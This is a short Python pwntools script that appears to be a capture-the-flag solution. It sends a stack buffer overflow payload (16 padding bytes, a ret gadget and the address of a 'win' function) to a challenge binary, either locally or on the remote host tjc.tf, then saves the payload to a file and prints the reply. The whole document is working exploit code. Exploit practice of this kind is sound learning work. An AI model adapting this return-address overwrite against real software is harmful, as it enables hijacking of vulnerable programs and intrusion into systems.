from pwn import *

e = ELF("./bin/out")

context.binary = e

context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = process([e.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31457)

    return r

p = conn() #e.process()

#p = remote("localhost", 5000)
#push rbp; mov rbp rsp
payload = b"A" * 16 + p64(0x40117a) + p64(0xdeadbeef) + p64(0x0401016) + p64(e.symbols["win"])

open("payload.dat", "wb+").write(payload)

p.sendline(payload)

print(p.recvline())
print(p.recvline())
